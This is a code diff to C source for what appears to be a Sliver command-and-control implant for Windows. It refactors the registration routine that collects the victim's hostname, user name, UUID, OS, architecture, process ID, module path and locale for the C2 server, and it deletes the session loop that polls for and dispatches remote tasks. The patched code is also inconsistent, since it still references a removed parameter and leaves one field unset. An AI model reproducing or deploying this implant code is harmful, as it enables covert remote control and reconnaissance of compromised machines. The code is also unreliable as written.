@@ -47,10 +47,9 @@ PSLIVER_THREADPOOL InitializeSliverThreadPool(void)
 	return pResult;
 }
 
-PBYTE RegisterSliver
+PBUFFER RegisterSliver
 (
-	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
-	_In_ PDWORD pcbOutput
+	_In_ PGLOBAL_CONFIG pConfig
 )
 {
 	LPSTR lpUUID = NULL;
@@ -68,7 +67,7 @@ PBYTE RegisterSliver
 	DWORD dwLastError = 0;
 	LPSTR lpLocaleName = NULL;
 	WCHAR wszLocale[0x20];
-	PBYTE pResult = NULL;
+	PBUFFER pResult = NULL;
 	DWORD cbResult = 1;
 	CHAR szOsName[] = "windows";
 
@@ -135,9 +134,10 @@ PBYTE RegisterSliver
 
 	GetSystemDefaultLocaleName(wszLocale, 0x20);
 	lpLocaleName = ConvertWcharToChar(wszLocale);
+	lpHostName = GetHostName();
 
 	SecureZeroMemory(ElementList, sizeof(ElementList));
-	ElementList[0] = CreateBytesElement(pSliverClient->szSliverName, lstrlenA(pSliverClient->szSliverName), 1);
+	ElementList[0] = CreateBytesElement(pConfig->szSliverName, lstrlenA(pConfig->szSliverName), 1);
 	ElementList[1] = CreateBytesElement(lpHostName, lstrlenA(lpHostName), 2);
 	ElementList[2] = CreateBytesElement(lpUUID + 1, lstrlenA(lpUUID + 1), 3);
 	ElementList[3] = CreateBytesElement(lpFullQualifiedName, lstrlenA(lpFullQualifiedName), 4);
@@ -147,23 +147,21 @@ PBYTE RegisterSliver
 	ElementList[7] = CreateBytesElement(lpArch, lstrlenA(lpArch), 8);
 	ElementList[8] = CreateVarIntElement(GetCurrentProcessId(), 9);
 	ElementList[9] = CreateBytesElement(lpModulePath, lstrlenA(lpModulePath), 10);
-	ElementList[10] = CreateBytesElement(pSliverClient->lpHostName, lstrlenA(pSliverClient->lpHostName), 11);
 	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
 	ElementList[12] = CreateVarIntElement(pSliverClient->uReconnectInterval, 13);
 	if (pSliverClient->HttpConfig.pProxyConfig != NULL && pSliverClient->HttpConfig.pProxyConfig->pUri != NULL) {
 		ElementList[13] = CreateBytesElement(pSliverClient->HttpConfig.pProxyConfig->pUri, lstrlenA(pSliverClient->HttpConfig.pProxyConfig->pUri), 14);
 	}
 
-	ElementList[14] = CreateBytesElement(pSliverClient->szConfigID, lstrlenA(pSliverClient->szConfigID), 16);
-	ElementList[15] = CreateVarIntElement(pSliverClient->uPeerID, 17);
+	ElementList[14] = CreateBytesElement(pConfig->szConfigID, lstrlenA(pConfig->szConfigID), 16);
+	ElementList[15] = CreateVarIntElement(pConfig->uPeerID, 17);
 	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 
 	pFinalElement = CreateStructElement(ElementList, _countof(ElementList), 0);
-	pResult = ALLOC(pFinalElement->cbMarshalledData);
-	memcpy(pResult, pFinalElement->pMarshalledData, pFinalElement->cbMarshalledData);
-	if (pcbOutput != NULL) {
-		*pcbOutput = pFinalElement->cbMarshalledData;
-	}
+	pResult = ALLOC(sizeof(BUFFER));
+	pResult->pBuffer = pFinalElement->pMarshalledData;
+	pFinalElement->pMarshalledData = NULL;
+	pResult->cbBuffer = pFinalElement->cbMarshalledData;
 CLEANUP:
 	if (lpHostName != NULL) {
 		FREE(lpHostName);
@@ -270,57 +268,12 @@ PENVELOPE UnmarshalEnvelope
 	ElementList[2]->Type = Bytes;
 	ElementList[3]->Type = Varint;
 
-	pResult = UnmarshalStruct(ElementList, _countof(ElementList), pInput, cbInput, NULL);
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), pData->pBuffer, pData->cbBuffer, NULL);
 	for (i = 0; i < _countof(ElementList); i++) {
 		FREE(ElementList[i]);
 	}
 
 	return pResult;
-}
-
-VOID SessionMainLoop
-(
-	_In_ PSLIVER_HTTP_CLIENT pSliverClient
-)
-{
-	PENVELOPE pEnvelope = NULL;
-	PSLIVER_THREADPOOL pSliverPool = NULL;
-	PTP_WORK pWork = NULL;
-	PENVELOPE_WRAPPER pWrapper = NULL;
-
-	pSliverPool = InitializeSliverThreadPool();
-	if (pSliverPool == NULL) {
-		goto CLEANUP;
-	}
-
-	pSliverClient->dwPollTimeout = 30;
-	while (TRUE) {
-		pSliverClient->HttpConfig.dwSendTimeout = pSliverClient->dwPollTimeout * 1000;
-		pEnvelope = ReadEnvelope(pSliverClient);
-		if (pEnvelope == NULL) {
-			Sleep(pSliverClient->dwPollInterval * 1000);
-			continue;
-		}
-
-		PrintFormatW(L"Receive Envelope:\n");
-		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
-		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
-		pWrapper->pSliverClient = pSliverClient;
-		pWrapper->pEnvelope = pEnvelope;
-		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
-		if (pWork == NULL) {
-			LOG_ERROR("CreateThreadpoolWork", GetLastError());
-			goto CLEANUP;
-		}
-
-		TpPostWork(pWork);
-		Sleep(pSliverClient->dwPollInterval * 1000);
-	}
-
-CLEANUP:
-	FreeSliverThreadPool(pSliverPool);
-
-	return;
 }
 
 PENVELOPE ReadEnvelope
